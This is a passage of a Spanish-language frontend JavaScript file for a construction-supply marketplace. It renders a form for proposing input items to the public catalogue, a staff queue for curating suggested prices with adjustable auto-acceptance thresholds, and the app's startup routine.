            Vas a proponer <strong>${esc(name)}</strong> para que forme parte del catalogo publico de insumos.
        </p>
        <ul class="lib-propose-list">
            <li>La propuesta entra a una <strong>cola de revision</strong>: un curador verifica nombre, unidad, categoria y precio antes de publicarla.</li>
            <li>Mientras se revisa, el insumo sigue siendo tuyo y podes usarlo normalmente en tus presupuestos.</li>
            <li>Si se aprueba, queda visible para todos y sus precios empiezan a alimentarse de las cotizaciones del mercado.</li>
            <li>Si se rechaza, no pasa nada con tu insumo: solo no se publica.</li>
        </ul>
        <div style="text-align:right;margin-top:16px">
            <button class="btn btn-secondary" onclick="closeModal()" style="margin-right:8px">Cancelar</button>
            <button class="btn btn-primary" onclick="confirmProposeInsumo(${Number(id)})">${icon('send', 15)} Enviar a revision</button>
        </div>
    `);
}

async function confirmProposeInsumo(id) {
    try {
        const resp = await API._fetch(`/company-insumos/${Number(id)}/propose-to-catalog`, { method: 'POST', body: JSON.stringify({}) });
        let data = {};
        try { data = await resp.json(); } catch {}
        if (resp.status === 409) {
            closeModal();
            toast(_apuDetailList(data)[0] || 'Este insumo ya fue propuesto al catalogo', 'info');
            loadCompanyInsumos(_lib.offset);
            return;
        }
        if (!resp.ok || data.ok === false) {
            toast(_apuDetailList(data)[0] || 'No se pudo enviar la propuesta', 'error');
            return;
        }
        closeModal();
        const sid = data.data && data.data.suggestion_id;
        toast(sid ? `Propuesta #${sid} enviada a revision` : 'Propuesta enviada a revision', 'success');
        loadCompanyInsumos(_lib.offset);
    } catch { toast('Error de conexion', 'error'); }
}

// Cerrar sugerencias del catalogo (modal de importar) al hacer clic fuera
document.addEventListener('click', (e) => {
    const box = document.getElementById('lib-cat-results');
    if (box && !e.target.closest('.apu-search-wrap')) box.style.display = 'none';
});

// ═══════════════════════════════════════════════════════════════
// ── Cola de curacion de precios (staff) ────────────────────────
// ═══════════════════════════════════════════════════════════════

const CUR_STATES = [
    { key: 'pending',       label: 'Pendientes' },
    { key: 'auto_accepted', label: 'Auto-aceptadas' },
    { key: 'accepted',      label: 'Aceptadas' },
    { key: 'rejected',      label: 'Rechazadas' },
];

const CUR_KINDS = {
    price_update: { label: 'Actualizacion de precio', cls: 'badge-primary' },
    new_insumo:   { label: 'Insumo nuevo',            cls: 'badge-warning' },
};

const _cur = {
    state: 'pending',
    kind: '',
    offset: 0,
    limit: 25,
    total: 0,
    stats: null,
    configOpen: false,
};

function _curKind(kind) {
    return CUR_KINDS[String(kind || '').toLowerCase()] || { label: String(kind || ''), cls: 'badge-gray' };
}

// Alza = rojo (encarece), baja = verde (abarata). Sin variacion = neutro.
function _curDeltaClass(pct) {
    const n = Number(pct);
    if (!isFinite(n) || Math.abs(n) < 0.005) return 'flat';
    return n > 0 ? 'up' : 'down';
}

function _curPct(pct) {
    const n = Number(pct);
    if (!isFinite(n)) return '—';
    return `${n > 0 ? '+' : ''}${_apuNum(n, 1)}%`;
}

async function renderCuracion() {
    if (!isStaff()) { showLoginModal(); navigate('home'); return; }
    const page = document.getElementById('page-content');
    if (!page) return;

    const tabs = CUR_STATES.map(s => `
        <button class="cur-tab${_cur.state === s.key ? ' active' : ''}" onclick="switchCurationState('${escJs(s.key)}')">
            ${esc(s.label)}<span class="cur-tab-count" id="cur-count-${esc(s.key)}"></span>
        </button>
    `).join('');

    page.innerHTML = `
        <div class="page-header apu-header">
            <div>
                <h1 class="page-title">Curacion de precios</h1>
                <p class="page-subtitle">Sugerencias que el motor estadistico dejo para revision humana antes de tocar el catalogo</p>
            </div>
            <div class="apu-header-actions">
                <button class="btn btn-secondary" onclick="toggleCurationConfig()">
                    ${icon('sliders', 16)} Umbrales
                </button>
            </div>
        </div>

        <div id="cur-config" class="cur-config" style="display:${_cur.configOpen ? '' : 'none'}"></div>

        <div class="cur-toolbar">
            <div class="cur-tabs">${tabs}</div>
            <select class="form-select cur-kind" onchange="filterCurationKind(this.value)">
                <option value=""${_cur.kind === '' ? ' selected' : ''}>Todos los tipos</option>
                <option value="price_update"${_cur.kind === 'price_update' ? ' selected' : ''}>Actualizacion de precio</option>
                <option value="new_insumo"${_cur.kind === 'new_insumo' ? ' selected' : ''}>Insumo nuevo</option>
            </select>
        </div>

        <div id="cur-stats"></div>
        <div id="cur-list"><div class="empty-state"><p>Cargando cola...</p></div></div>
        <div id="cur-pagination" class="lib-pagination"></div>
    `;
    if (_cur.configOpen) loadCurationConfig();
    loadCurationQueue(0);
}

function switchCurationState(st) {
    _cur.state = st;
    _cur.offset = 0;
    document.querySelectorAll('.cur-tab').forEach(t => t.classList.remove('active'));
    const idx = CUR_STATES.findIndex(s => s.key === st);
    const el = document.querySelectorAll('.cur-tab')[idx];
    if (el) el.classList.add('active');
    loadCurationQueue(0);
}

function filterCurationKind(kind) {
    _cur.kind = kind || '';
    loadCurationQueue(0);
}

async function loadCurationQueue(offset = 0) {
    const box = document.getElementById('cur-list');
    if (!box) return;
    _cur.offset = Number(offset) || 0;
    const q = new URLSearchParams();
    q.set('state', _cur.state);
    if (_cur.kind) q.set('kind', _cur.kind);
    q.set('limit', String(_cur.limit));
    q.set('offset', String(_cur.offset));

    try {
        const resp = await API.curationQueue('?' + q.toString());
        if (!resp.ok) {
            box.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudo cargar la cola'))}</p></div>`;
            return;
        }
        const list = resp.data || [];
        _cur.total = Number(resp.total != null ? resp.total : list.length);
        _cur.stats = resp.stats || null;
        renderCurationStats();
        if (!list.length) {
            box.innerHTML = `
                <div class="apu-empty">
                    <div class="apu-empty-ico">${icon('check-circle', 40)}</div>
                    <h3>Nada por revisar</h3>
                    <p>No hay sugerencias en este estado con los filtros actuales.</p>
                </div>
            `;
            renderCurationPagination();
            return;
        }
        box.innerHTML = `<div class="cur-grid">${list.map(renderCurationCard).join('')}</div>`;
        renderCurationPagination();
    } catch {
        box.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderCurationStats() {
    const box = document.getElementById('cur-stats');
    const st = _cur.stats;
    // El contador de cada tab se alimenta de stats si el backend lo manda
    CUR_STATES.forEach(s => {
        const el = document.getElementById('cur-count-' + s.key);
        if (!el) return;
        const n = st && st[s.key] != null ? st[s.key] : null;
        el.textContent = n != null ? ` ${n}` : '';
    });
    if (!box) return;
    if (!st) { box.innerHTML = ''; return; }
    const cells = [
        { k: 'pending', lbl: 'Pendientes' },
        { k: 'auto_accepted', lbl: 'Auto-aceptadas' },
        { k: 'accepted', lbl: 'Aceptadas' },
        { k: 'rejected', lbl: 'Rechazadas' },
    ].filter(c => st[c.k] != null);
    if (!cells.length) { box.innerHTML = ''; return; }
    box.innerHTML = `
        <div class="apu-kpis">
            ${cells.map((c, i) => `
                <div class="apu-kpi${i === 0 ? ' apu-kpi-hero' : ''}">
                    <span class="apu-kpi-val">${esc(String(st[c.k]))}</span>
                    <span class="apu-kpi-lbl">${esc(c.lbl)}</span>
                </div>
            `).join('')}
        </div>
    `;
}

function renderCurationCard(s) {
    const id = Number(s.id);
    const kind = _curKind(s.kind);
    const cur = s.currency || 'BOB';
    const dCls = _curDeltaClass(s.deviation_pct);
    const isNew = String(s.kind || '') === 'new_insumo' || s.current_price == null;
    const pending = String(s.state || '') === 'pending';

    return `
        <article class="cur-card cur-${esc(dCls)}" id="cur-card-${id}">
            <header class="cur-card-head">
                <div class="cur-card-title">
                    <span class="cur-name">${esc(s.name)}</span>
                    <span class="cur-meta">
                        ${s.uom ? esc(s.uom) : ''}${s.category ? `<span class="apu-dot"></span>${esc(s.category)}` : ''}
                        ${s.insumo_id ? `<span class="apu-dot"></span>#${esc(String(s.insumo_id))}` : ''}
                    </span>
                </div>
                <span class="badge ${kind.cls}">${esc(kind.label)}</span>
            </header>

            <div class="cur-prices">
                <div class="cur-price">
                    <span class="cur-price-lbl">Precio vigente</span>
                    <span class="cur-price-val">${isNew ? '—' : esc(_apuMoney(s.current_price, cur))}</span>
                </div>
                <div class="cur-arrow">${icon('chevron-right', 18)}</div>
                <div class="cur-price cur-price-new">
                    <span class="cur-price-lbl">Precio propuesto</span>
                    <span class="cur-price-val">${esc(_apuMoney(s.suggested_price, cur))}</span>
                </div>
                <div class="cur-delta cur-delta-${esc(dCls)}">
                    <span class="cur-delta-val">${isNew ? 'Nuevo' : esc(_curPct(s.deviation_pct))}</span>
                    <span class="cur-delta-lbl">${isNew ? 'sin historial' : (dCls === 'up' ? 'alza' : dCls === 'down' ? 'baja' : 'sin cambio')}</span>
                </div>
            </div>

            <div class="cur-signals">
                <span class="cur-sig" title="Cuantas desviaciones estandar se aleja del historial">
                    z = <strong>${s.z_score == null ? '—' : esc(_apuNum(s.z_score, 2))}</strong>
                </span>
                <span class="cur-sig" title="Observaciones de precio que respaldan la sugerencia">
                    ${icon('bar-chart', 13)} <strong>${esc(String(s.sample_count != null ? s.sample_count : 0))}</strong> observaciones
                </span>
                ${s.source ? `<span class="cur-sig">${icon('tag', 13)} ${esc(s.source)}</span>` : ''}
                ${s.created_at ? `<span class="cur-sig">${icon('clock', 13)} ${esc(_apuDate(s.created_at))}</span>` : ''}
            </div>

            ${s.decision_reason ? `
                <div class="cur-reason">
                    ${icon('info', 15)}
                    <span>${esc(s.decision_reason)}</span>
                </div>` : ''}

            ${pending ? `
                <div class="cur-actions">
                    <input class="form-input cur-note" id="cur-note-${id}" maxlength="240"
                           placeholder="Nota para el historial (opcional)">
                    <button class="btn btn-sm btn-success" onclick="acceptCurationSuggestion(${id})">
                        ${icon('check', 14)} Aceptar
                    </button>
                    <button class="btn btn-sm btn-danger" onclick="rejectCurationSuggestion(${id})">
                        ${icon('x', 14)} Rechazar
                    </button>
                </div>`
            : `<div class="cur-closed">Estado: <strong>${esc(String(s.state || ''))}</strong>${s.decision_reason ? '' : ''}</div>`}
        </article>
    `;
}

function _curNote(id) {
    const el = document.getElementById('cur-note-' + Number(id));
    const v = el ? el.value.trim() : '';
    return v || null;
}

async function acceptCurationSuggestion(id) {
    try {
        const resp = await API.curationAccept(id, _curNote(id));
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo aceptar', 'error'); return; }
        toast('Sugerencia aceptada', 'success');
        const card = document.getElementById('cur-card-' + Number(id));
        if (card) card.remove();
        loadCurationQueue(_cur.offset);
    } catch { toast('Error de conexion', 'error'); }
}

async function rejectCurationSuggestion(id) {
    try {
        const resp = await API.curationReject(id, _curNote(id));
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo rechazar', 'error'); return; }
        toast('Sugerencia rechazada', 'success');
        const card = document.getElementById('cur-card-' + Number(id));
        if (card) card.remove();
        loadCurationQueue(_cur.offset);
    } catch { toast('Error de conexion', 'error'); }
}

function renderCurationPagination() {
    const box = document.getElementById('cur-pagination');
    if (!box) return;
    if (_cur.total <= _cur.limit) { box.innerHTML = ''; return; }
    const page = Math.floor(_cur.offset / _cur.limit) + 1;
    const pages = Math.ceil(_cur.total / _cur.limit);
    box.innerHTML = `
        <button class="btn btn-sm btn-secondary" ${_cur.offset <= 0 ? 'disabled' : ''}
                onclick="loadCurationQueue(${Math.max(0, _cur.offset - _cur.limit)})">&larr; Anterior</button>
        <span class="lib-page-info">Pagina ${esc(String(page))} de ${esc(String(pages))} &middot; ${esc(String(_cur.total))} sugerencias</span>
        <button class="btn btn-sm btn-secondary" ${page >= pages ? 'disabled' : ''}
                onclick="loadCurationQueue(${_cur.offset + _cur.limit})">Siguiente &rarr;</button>
    `;
}

// ── Umbrales de auto-aceptacion ───────────────────────────────
function toggleCurationConfig() {
    _cur.configOpen = !_cur.configOpen;
    const box = document.getElementById('cur-config');
    if (!box) return;
    box.style.display = _cur.configOpen ? '' : 'none';
    if (_cur.configOpen) loadCurationConfig();
}

async function loadCurationConfig() {
    const box = document.getElementById('cur-config');
    if (!box) return;
    box.innerHTML = '<div class="empty-state"><p>Cargando umbrales...</p></div>';
    try {
        const resp = await API.curationConfig();
        if (!resp.ok) {
            box.innerHTML = `<div class="empty-state"><p>${esc(_apuDetail(resp, 'No se pudo cargar la configuracion'))}</p></div>`;
            return;
        }
        renderCurationConfig(resp.data || {});
    } catch {
        box.innerHTML = '<div class="empty-state"><p>Error de conexion</p></div>';
    }
}

function renderCurationConfig(c) {
    const box = document.getElementById('cur-config');
    if (!box) return;
    box.innerHTML = `
        <form class="cur-config-form" onsubmit="saveCurationConfig(event)">
            <div class="cur-config-head">
                ${icon('sliders', 16)}
                <span>Umbrales de la cola</span>
                <span class="apu-comp-hint">Definen que se acepta solo y que baja a revision manual</span>
            </div>
            <div class="cur-config-grid">
                <div class="form-group">
                    <label class="form-label">Observaciones minimas</label>
                    <input class="form-input" name="min_samples" type="number" step="1" min="1"
                           value="${esc(String(c.min_samples != null ? c.min_samples : 3))}">
                    <span class="apu-hint">Debajo de esto, siempre va a revision</span>
                </div>
                <div class="form-group">
                    <label class="form-label">z-score de auto-aceptacion</label>
                    <input class="form-input" name="z_auto" type="number" step="0.1" min="0"
                           value="${esc(String(c.z_auto != null ? c.z_auto : 2))}">
                    <span class="apu-hint">Hasta este z, se acepta sin humano</span>
                </div>
                <div class="form-group">
                    <label class="form-label">Variacion % de auto-aceptacion</label>
                    <input class="form-input" name="pct_auto" type="number" step="0.5" min="0"
                           value="${esc(String(c.pct_auto != null ? c.pct_auto : 10))}">
                    <span class="apu-hint">Cambios menores a este % pasan solos</span>
                </div>
                <div class="form-group">
                    <label class="form-label">Ratio maximo aceptable</label>
                    <input class="form-input" name="max_ratio" type="number" step="0.1" min="1"
                           value="${esc(String(c.max_ratio != null ? c.max_ratio : 3))}">
                    <span class="apu-hint">Por encima se descarta como error de carga</span>
                </div>
                <div class="form-group">
                    <label class="form-label">Ventana de dias</label>
                    <input class="form-input" name="window_days" type="number" step="1" min="1"
                           value="${esc(String(c.window_days != null ? c.window_days : 90))}">
                    <span class="apu-hint">Historial considerado para la estadistica</span>
                </div>
                <div class="form-group">
                    <label class="form-label">Auto-aceptacion</label>
                    <select class="form-select" name="auto_accept_enabled">
                        <option value="1"${c.auto_accept_enabled ? ' selected' : ''}>Activada</option>
                        <option value="0"${c.auto_accept_enabled ? '' : ' selected'}>Desactivada (todo a revision)</option>
                    </select>
                </div>
            </div>
            <div style="text-align:right;margin-top:8px">
                <button type="button" class="btn btn-secondary btn-sm" onclick="toggleCurationConfig()" style="margin-right:8px">Cerrar</button>
                <button type="submit" class="btn btn-primary btn-sm">Guardar umbrales</button>
            </div>
        </form>
    `;
}

async function saveCurationConfig(e) {
    e.preventDefault();
    const f = e.target;
    const payload = {
        min_samples: parseInt(f.min_samples.value, 10) || 1,
        z_auto: parseFloat(f.z_auto.value) || 0,
        pct_auto: parseFloat(f.pct_auto.value) || 0,
        max_ratio: parseFloat(f.max_ratio.value) || 1,
        window_days: parseInt(f.window_days.value, 10) || 1,
        auto_accept_enabled: f.auto_accept_enabled.value === '1',
    };
    try {
        const resp = await API.curationSetConfig(payload);
        if (!resp.ok) { toast(_apuDetailList(resp)[0] || 'No se pudo guardar', 'error'); return; }
        toast('Umbrales actualizados', 'success');
        loadCurationQueue(0);
    } catch { toast('Error de conexion', 'error'); }
}

// ── Init ───────────────────────────────────────────────────────
async function init() {
    // Restore session (optional — app works without it)
    state.token = localStorage.getItem('_mkt_token');
    state.refreshToken = localStorage.getItem('_mkt_refresh');
    try { state.user = JSON.parse(localStorage.getItem('_mkt_user')); } catch {}

    // Load cart from localStorage
    loadCart();

    // Load catalog data + site config in parallel
    await Promise.all([loadCatalogData(), loadSiteConfig()]);

    // Hide loading screen
    const loading = document.getElementById('loading-screen');
    if (loading) loading.classList.add('hidden');

    // Register service worker
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/sw.js').catch(() => {});
    }

    const pathMatch = window.location.pathname.match(/^\/p\/(\d+)$/);
    if (pathMatch) {
        state.currentPage = 'productDetail';
        state.currentParams = { id: parseInt(pathMatch[1], 10), _noPushState: true };
    }

    renderApp();

    // Start notification polling if logged in
    if (state.user) startNotifPolling();
}

document.addEventListener('DOMContentLoaded', init);

// Close hero suggestions when clicking outside
document.addEventListener('click', (e) => {
    const sugEl = document.getElementById('hero-suggestions');
    if (sugEl && !e.target.closest('.home-search-wrap')) sugEl.style.display = 'none';
});
